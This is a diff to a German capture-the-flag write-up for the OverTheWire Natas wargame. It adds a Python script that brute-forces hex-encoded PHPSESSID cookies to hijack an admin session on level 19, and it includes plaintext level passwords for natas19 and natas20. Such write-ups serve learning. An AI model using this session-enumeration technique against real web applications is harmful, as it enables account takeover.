@@ -422,3 +422,37 @@ for i in sessions:
 Zugriff:	[http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org)
 Username: `natas19`
 Passwort: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  `
+
+Die PHPSESSID ist zws. 1 und 640-admin als Hex-wert codiert.
+
+```Python
+import requests
+
+auth_user = "natas19"
+auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
+url = "http://natas19.natas.labs.overthewire.org/"
+list = [x for x in range(59594)][::-1]
+
+sessions = [x for x in range(1, 640)]
+for i in sessions:
+    sessid = str(i)+"-admin"
+    hexvals = [format(ord(str(x)), "x") for x in sessid]
+    cookie = "".join(hexvals)
+
+    print("Sniffing Session: ID " +str(i)+ " "+ cookie)
+    cookies = {'PHPSESSID': cookie}
+    r = requests.post(url,
+                      auth=(auth_user, auth_password),
+                      cookies=cookies)
+
+    if 'You are an admin.' in r.text:
+        print("Admin Session found. ID = " + str(i))
+        print(r.text)
+        break
+```
+
+# Natas 20
+
+Zugriff:	[http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
+Username: `natas20`
+Passwort: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF  `
